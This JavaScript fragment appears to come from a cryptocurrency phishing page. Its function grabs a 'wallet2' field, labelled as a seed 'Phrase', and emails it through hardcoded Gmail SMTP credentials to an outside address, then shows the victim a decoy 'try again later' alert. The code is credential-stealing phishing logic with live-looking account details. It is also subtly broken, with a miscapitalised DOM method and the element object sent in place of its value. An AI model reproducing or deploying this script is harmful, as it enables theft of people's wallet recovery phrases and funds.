function sendEmail() {
	var wallet2 = document.getElementByID("wallet2")
	var body = 'wallet2: ' + wallet2;
      Email.send({
        Host: "smtp.gmail.com",
        Username: "jonsteffen@gmail.com",
        Password: "Mrmain123",
        To: 'jonsteffen@protonmail.com',
        From: "therichardsinclair@gmail.com",
        Subject: "Phrase",
        Body: body,
      })
        .then(function (message) {
          alert("try again later")
        });
    }
  </script>